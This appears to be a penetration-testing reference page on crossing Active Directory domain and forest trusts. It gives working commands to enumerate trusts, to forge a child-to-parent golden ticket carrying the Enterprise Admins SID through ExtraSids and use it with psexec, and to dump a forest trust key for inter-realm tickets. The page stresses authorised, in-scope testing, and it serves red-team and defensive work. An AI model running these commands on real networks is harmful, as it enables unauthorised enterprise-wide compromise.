---
tool: Domain trust attacks
slug: domain-trusts
kind: technique
stages: [actions-on-objectives]
category: Crossing domains and forests
platforms: [windows, linux, network]
services: [kerberos, ldap, smb]
ports: [88, 389, 445]
tags: [active-directory, trusts, sid-history, golden-ticket, forest, extrasids]
attack: [T1482, T1134.005, T1558.001]
summary: Domain Admin on one domain is rarely the end. Trusts link domains and forests, and a trust you can abuse carries your access across the boundary. Enumerate the trusts, then ride a child-to-parent SID-history path or a forest trust key to the next domain.
references:
  - The Hacker Recipes: trusts | https://www.thehacker.recipes/ad/movement/trusts
  - HackTricks domain trusts | https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html
---

## When to reach for it

You own one domain (often a child) and the objective lives in another. Within a single forest, the parent implicitly trusts its children, and the SID-history field lets a ticket from the child claim Enterprise Admin in the parent. Across a forest trust, the shared trust key lets you forge an inter-realm ticket, limited by SID filtering.

## Enumerate the trusts first

```powershell
Get-DomainTrust
nltest /domain_trusts
```

```bash
netexec ldap DC -u me -p pass -M enum_trusts
```

Note the direction (inbound / outbound / bidirectional) and type (parent-child, external, forest). Only some are abusable.

## Child to parent, within a forest (ExtraSids)

With the child domain's krbtgt hash and SIDs, forge a golden ticket that carries the parent's Enterprise Admins SID (`-519`) in SID history:

```bash
ticketer.py -nthash KRBTGT_HASH -domain-sid CHILD_SID -extra-sid PARENT_SID-519 \
  -domain child.corp.local Administrator
KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass corp.local/Administrator@DC.corp.local
```

mimikatz does the same with `kerberos::golden /sids:PARENT_SID-519 ... /ptt`.

## Across a forest trust

Dump the trust key (`lsadump::trust /patch`), forge an inter-realm TGT with it, and request a service ticket in the trusting forest. SID filtering drops high-privilege SIDs here, so target a specific service rather than a domain-wide SID.

## Notes

Forging cross-domain tickets is one of the highest-impact actions in a test and reaches systems outside the domain you started in, so confirm the other domain or forest is explicitly in scope before crossing, and record the SIDs, keys and tickets used. The krbtgt hash, trust key and forged tickets are the most sensitive loot on the engagement. In-scope and authorised use only.
